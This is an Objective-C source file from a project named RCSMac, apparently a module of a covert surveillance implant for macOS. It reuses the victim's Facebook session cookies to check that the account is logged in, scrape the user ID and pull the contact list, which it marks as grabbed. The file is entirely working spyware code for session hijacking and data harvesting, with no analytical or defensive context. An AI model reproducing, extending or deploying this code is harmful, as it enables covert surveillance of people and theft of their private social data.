//
//  __m_Social_Facebook.m
//  RCSMac
//
//  Created by guido on 3/22/13.
//
//

#import "__m_Social_Facebook.h"

static BOOL gFacebookContactGrabbed = NO;

@implementation __m_Social_Facebook

- (NSString *) getCookiePattern
{
    return @".facebook.";
}

- (int)isAuthorized
{
    int retVal = NO;
    NSString *facebookHome;
    NSData  *httpBuffer = [self sendHttpRequest: SOCIAL_FB_HOME];
    
    if (httpBuffer == nil)
        return SOCIAL_NETWORK_ERROR;
    
    facebookHome = [[NSString alloc] initWithData:httpBuffer encoding:NSUTF8StringEncoding];
    
    if ([facebookHome rangeOfString: SOCIAL_FB_USER_MARKER].length == 0)
        retVal = SOCIAL_PARSING_ERROR;
    else if ([facebookHome rangeOfString:SOCIAL_FB_USER_UNAUTHORIZED].length > 0)
        retVal = SOCIAL_UNAUTHORIZED;
    else
        retVal = YES;
    
    return retVal;
}

- (NSString *)getUserId
{
    NSRange firstRange, secondRange;
    NSString *userId, *facebookHome;
    NSData *httpBuffer = [self sendHttpRequest: SOCIAL_FB_HOME];
    
    if (httpBuffer == nil)
        return nil;
    
    facebookHome = [[NSString alloc] initWithData:httpBuffer encoding:NSUTF8StringEncoding];
    firstRange = [facebookHome rangeOfString: SOCIAL_FB_USER_MARKER];
    if (firstRange.length == 0)
        return nil;
    
    secondRange = [[facebookHome substringFromIndex:(firstRange.location + SOCIAL_FB_USER_MARKER.length)] rangeOfString:@"\","];
    if (secondRange.length == 0)
        return nil;
    
    userId = [facebookHome substringWithRange: NSMakeRange(firstRange.location + SOCIAL_FB_USER_MARKER.length, secondRange.location)];
    if (userId.length <= 1)
        return nil;
    
    return userId;
}

- (bool)getContacts
{
    if (gFacebookContactGrabbed == YES)
        return YES;
    
    NSString *userId = [self getUserId];
    if (userId == nil)
        return NO;
    
    NSString *contactsURL = [NSString stringWithFormat: SOCIAL_FB_CONTACTS, userId, userId];
    NSDictionary *jsonArray = [self getParsedHttpResponse:contactsURL jsonOffset:SOCIAL_FB_JSON_OFFSET];
    if (jsonArray == nil)
        return NO;
    
    NSDictionary *payload = [jsonArray objectForKey:@"payload"];
    if (payload == nil)
        return NO;
    
    NSDictionary *entries = [payload objectForKey:@"entries"];
    if (entries == nil)
        return NO;
    
    for (id a in entries)
    {
        NSLog(@"User: %@", [a objectForKey:@"text"]);
    }
    
    return gFacebookContactGrabbed = YES;
}

@end
